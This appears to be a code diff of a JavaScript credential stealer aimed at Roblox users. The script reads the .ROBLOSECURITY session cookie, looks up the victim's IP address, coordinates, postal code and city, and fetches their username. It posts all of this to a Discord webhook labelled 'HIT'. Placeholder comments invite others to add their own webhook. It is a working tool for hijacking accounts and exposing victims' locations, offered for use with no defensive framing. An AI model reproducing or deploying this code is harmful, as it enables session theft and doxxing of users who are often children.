@@ -1,88 +1,85 @@
-const webhookURL = "I'm calling from Curry Studios add ur webhook "; // Replace with your webhook URL
+const webhookURL = "YOUR WEBHOOK  IADDED ROBLOXSTATS SHIT"; // Your webhook URL
 
 async function sendGeoEmbed() {
   try {
-    // 1. Get IP address
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipObj = await ipRes.json();
-    const ip = ipObj.ip;
+    // Fetch IP address
+    const ip = await fetchIP();
+    if (!ip) throw new Error("Failed to retrieve IP address");
 
-    // 2. Get geolocation info
-    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-    const geo = await geoRes.json();
-
+    // Fetch geolocation info
+    const geo = await fetchGeo(ip);
     if (!geo || geo.error) {
-      console.error("Failed to fetch geolocation data");
-      return;
+      console.error("Failed to fetch geolocation data", geo?.error);
     }
 
-    // 3. Convert country code to emoji
-    const flagEmoji = countryCodeToEmoji(geo.country_code || "US");
+    // Convert country code to emoji, fallback to flag if error
+    const countryCode = geo?.country_code || "US";
+    const flagEmoji = countryCodeToEmoji(countryCode);
 
-    // 4. Get Roblox security token from cookies
-    const token = getCookie(".ROBLOSECURITY");
+    // Get Roblox security token from cookies
+    const token = getCookie(".ROBLOSECURITY") || "N/A";
 
-    // 5. Get your Roblox user ID
+    // Get Roblox user ID from URL
     const userId = getRobloxUserId();
 
-    // 6. Fetch username
-    const username = userId ? await getRobloxUsername(userId) : null;
+    // Fetch username if userId exists
+    const username = userId ? await getRobloxUsername(userId) : "Unknown";
 
-    // 7. Generate Roblox headshot URL only if userId exists
+    // Generate headshot URL or fallback image
     const headshotUrl = userId
       ? `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`
-      : null;
+      : "https://via.placeholder.com/150?text=No+Headshot";
 
-    // 8. Build embed message with decorative elements
+    // Build embed message
     const embed = {
       title: `🌐 IP Geolocation 📍`,
-      description: `🚩 Country: **${geo.country_name}** ${flagEmoji}`,
-      color: 0x1abc9c, // Nice teal color
+      description: `🚩 Country: **${geo?.country_name || "Unknown"}** ${flagEmoji}`,
+      color: 0x1abc9c,
       author: {
-        name: `👤 ${username ? `[**${username}**](https://www.roblox.com/users/${userId}/profile)` : 'Unknown User'}`,
-        url: username ? `https://www.roblox.com/users/${userId}/profile` : null,
-        icon_url: "https://cdn-icons-png.flaticon.com/512/847/847969.png" // User icon emoji
+        name: `👤 ${username}`,
+        url: userId ? `https://www.roblox.com/users/${userId}/profile` : null,
+        icon_url: "https://cdn-icons-png.flaticon.com/512/847/847969.png"
       },
       thumbnail: {
-        url: headshotUrl || "https://via.placeholder.com/150?text=No+Headshot"
+        url: headshotUrl
       },
       fields: [
         {
           name: "🗺️ Coordinates",
-          value: `📍 Latitude: **${geo.latitude}**\n📍 Longitude: **${geo.longitude}**`,
+          value: `📍 Latitude: **${geo?.latitude ?? "N/A"}**\n📍 Longitude: **${geo?.longitude ?? "N/A"}**`,
           inline: false
         },
         {
           name: "📫 Postal Code",
-          value: `🏢 ${geo.postal || "N/A"}`,
+          value: `🏢 ${geo?.postal ?? "N/A"}`,
           inline: false
         },
         {
           name: "🌍 Region / City",
-          value: `🗺️ ${geo.region}, ${geo.city}`,
+          value: `🗺️ ${geo?.region ?? "N/A"}, ${geo?.city ?? "N/A"}`,
           inline: false
         },
         {
           name: "🔑 Roblox Token",
-          value: `🔐 ${token || "No token found"}`,
+          value: `🔐 ${token}`,
           inline: false
         }
       ],
       timestamp: new Date().toISOString(),
       footer: {
         text: "🌐 Geo data via ipapi.co",
-        icon_url: "https://cdn-icons-png.flaticon.com/512/732/732200.png" // Globe icon
+        icon_url: "https://cdn-icons-png.flaticon.com/512/732/732200.png"
       }
     };
 
-    // 9. Prepare webhook message with decorated username and avatar
+    // Prepare webhook message
     const msg = {
-      username: "⚡☄️HIT",
+      username: "⚡✨HIT",
       avatar_url: "https://cdn.discordapp.com/avatars/1425248210359947368/fea665d6e4892cac13b6c4d397fedf1b.webp?size=80",
       embeds: [embed]
     };
 
-    // 10. Send webhook
+    // Send the webhook
     const resp = await fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -92,52 +89,85 @@ async function sendGeoEmbed() {
     if (resp.ok) {
       console.log("✅ Embed sent!");
     } else {
-      console.error("❌ Failed to send embed:", await resp.text());
+      const errorText = await resp.text();
+      console.error("❌ Failed to send embed:", resp.status, errorText);
     }
   } catch (error) {
-    console.error("❌ Error:", error);
+    console.error("❌ Error in sendGeoEmbed:", error);
   }
 }
 
-// Call the function to execute
-sendGeoEmbed();
+// Helper functions with comprehensive error handling
 
-// Helper functions
-function getRobloxUserId() {
-  const url = window.location.href;
-  const match = url.match(/\/users\/(\d+)\//);
-  if (match && match[1]) {
-    return match[1];
+async function fetchIP() {
+  try {
+    const response = await fetch("https://api.ipify.org?format=json");
+    if (!response.ok) throw new Error(`IP fetch failed with status ${response.status}`);
+    const data = await response.json();
+    return data?.ip ?? null;
+  } catch (err) {
+    console.error("Error fetching IP:", err);
+    return null;
   }
-  return null;
+}
+
+async function fetchGeo(ip) {
+  try {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (!response.ok) throw new Error(`Geo fetch failed with status ${response.status}`);
+    const data = await response.json();
+    return data;
+  } catch (err) {
+    console.error("Error fetching geolocation:", err);
+    return null;
+  }
 }
 
 function countryCodeToEmoji(cc) {
-  const OFFSET = 127397;
-  return cc
-    .toUpperCase()
-    .split('')
-    .map(c => String.fromCodePoint(c.charCodeAt(0) + OFFSET))
-    .join('');
+  try {
+    const OFFSET = 127397;
+    return cc
+      .toUpperCase()
+      .split('')
+      .map(c => String.fromCodePoint(c.charCodeAt(0) + OFFSET))
+      .join('');
+  } catch {
+    return "🏳️"; // fallback flag emoji
+  }
 }
 
 function getCookie(name) {
-  const value = `; ${document.cookie}`;
-  const parts = value.split(`; ${name}=`);
-  if (parts.length === 2) return parts.pop().split(';').shift();
-  return null;
+  try {
+    const value = `; ${document.cookie}`;
+    const parts = value.split(`; ${name}=`);
+    if (parts.length === 2) return parts.pop().split(';').shift();
+    return null;
+  } catch {
+    return null;
+  }
+}
+
+function getRobloxUserId() {
+  try {
+    const url = window.location.href;
+    const match = url.match(/\/users\/(\d+)\//);
+    return match ? match[1] : null;
+  } catch {
+    return null;
+  }
 }
 
 async function getRobloxUsername(userId) {
   try {
     const response = await fetch(`https://users.roblox.com/v1/users/${userId}`);
-    if (!response.ok) {
-      throw new Error('Failed to fetch username');
-    }
+    if (!response.ok) throw new Error(`Failed to fetch username with status ${response.status}`);
     const data = await response.json();
-    return data.name;
-  } catch (error) {
-    console.error('Error fetching username:', error);
-    return null;
+    return data?.name ?? "Unknown";
+  } catch (err) {
+    console.error('Error fetching username:', err);
+    return "Unknown";
   }
 }
+
+// Call the main function
+sendGeoEmbed();
